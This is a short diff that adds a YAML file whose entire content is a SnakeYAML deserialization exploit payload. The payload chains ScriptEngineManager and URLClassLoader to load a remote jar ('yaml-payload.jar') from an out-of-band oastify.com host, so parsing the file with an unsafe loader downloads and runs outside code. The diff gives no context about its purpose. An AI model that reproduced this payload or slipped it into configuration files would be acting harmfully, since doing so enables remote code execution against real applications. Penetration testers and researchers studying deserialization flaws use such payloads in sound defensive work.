@@ -1,0 +1,5 @@
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://pzs5yrbt12ewkdjhwj18y7m52w8nwdk2.oastify.com/yaml-payload.jar"]
+  ]]
+]
